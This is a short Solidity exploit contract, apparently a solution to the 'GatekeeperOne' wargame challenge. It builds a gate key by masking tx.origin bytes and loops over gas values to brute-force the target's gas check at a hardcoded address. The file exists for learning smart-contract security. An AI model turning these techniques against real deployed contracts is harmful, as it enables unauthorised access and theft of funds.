// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./GatekeeperOne.sol";

contract GatekeeperAttack{
    GatekeeperOne victim = GatekeeperOne(0x425FcE08552494ffFd90841891Ae93f4B1e092e0);
    bytes8 mask =   0xFFFFFFFF0000FFFF;
    bytes8 origin = 0xbE5886A3d86cA244;
    bytes8 gateKey = origin & mask;
    constructor()public{}

    function attack()public returns (bool){
        for(uint i = 0; i < 150; i++){
            (bool result, bytes memory data) = address(victim).call{gas: i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if(result){
                break;
            }
        }
    }
}